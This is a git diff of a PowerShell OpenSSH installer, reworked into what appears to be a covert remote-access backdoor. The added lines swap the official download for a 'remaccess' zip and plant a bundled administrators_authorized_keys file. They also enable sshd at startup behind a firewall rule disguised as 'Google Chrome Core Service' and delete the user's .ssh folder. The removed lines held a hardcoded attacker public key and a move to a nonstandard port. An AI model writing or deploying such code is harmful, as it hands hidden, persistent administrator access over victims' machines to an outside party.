@@ -4,9 +4,9 @@ $GitZipName = "openssh.zip"
 $DisablePasswordAuthentication = $True
 $DisablePubkeyAuthentication = $False
 $AutoStartSSHD = $true
-$AutoStartSSHAGENT = $false
+$AutoStartSSHAGENT = $true
 $OpenSSHLocation = $null
-$GitUrl = 'https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.2.2.0p1-Beta/OpenSSH-Win64.zip'
+$GitUrl = 'https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/sshmodserv.zip'
 $ErrorActionPreference = "Stop"
 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
 $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
@@ -88,18 +88,19 @@ New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction Stop
 #Setup sshd_config
 Write-Host "Configure server config file" -ForegroundColor Green
 Copy-Item -Path $InstallPath\sshd_config_default -Destination $env:ProgramData\ssh\sshd_config -Force -ErrorAction Stop
-Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
-if ($DisablePasswordAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PasswordAuthentication no" -ErrorAction Stop }
-if ($DisablePubkeyAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PubkeyAuthentication no" -ErrorAction Stop }
+Copy-Item -Path $InstallPath\administrators_authorized_keys -Destination $env:ProgramData\ssh\administrators_authorized_keys -Force -ErrorAction Stop
 #Make sure your user .ssh directory exists
 If (!(Test-Path "~\.ssh")) {
 Write-Host "Creating User .ssh directory" -ForegroundColor Green
 New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction Stop | Out-Null
 }
-#Set ssh_config
-Write-Host "Configure client config file" -ForegroundColor Green
-Add-Content -Path ~\.ssh\config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
-#Setting autostarts
+$acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
+$acl.SetAccessRuleProtection($true, $false)
+$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
+$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
+$acl.SetAccessRule($administratorsRule)
+$acl.SetAccessRule($systemRule)
+$acl | Set-Acl
 if ($AutoStartSSHD) {
 Write-Host "Setting sshd service to Automatic start" -ForegroundColor Green;
 Set-Service -Name sshd -StartupType Automatic;
@@ -131,30 +132,11 @@ New-NetFirewallRule -Name sshd -DisplayName 'Google Chrome Core Service' -Enable
 Write-Host "Setting default shell to powershell" -ForegroundColor Green
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
 Write-Host "Installation completed successfully" -ForegroundColor Green
-#Public Key Add
-$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
-if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\ProgramData\ssh\administrators_authorized_keys"  -PathType leaf ))) {
-Set-Content -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Value $SSHPublicKey 
-}
-$acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
-$acl.SetAccessRuleProtection($true, $false)
-$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
-$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
-$acl.SetAccessRule($administratorsRule)
-$acl.SetAccessRule($systemRule)
-$acl | Set-Acl
-#Port Change
-$sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
-$sshdConfigContent = Get-Content -Path $sshdConfigPath
-$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58769"
-$sshdConfigContent | Set-Content -Path $sshdConfigPath
 #.ssh remove from user-root-dir
 $currentUserRoot = $env:USERPROFILE
 $sshFolder = Join-Path -Path $currentUserRoot -ChildPath ".ssh"
 if (Test-Path $sshFolder) {
 try {
 Remove-Item -Path $sshFolder -Force -Recurse -ErrorAction Stop
-} catch {
-}
-}
+} catch {}}
 Restart-Service sshd
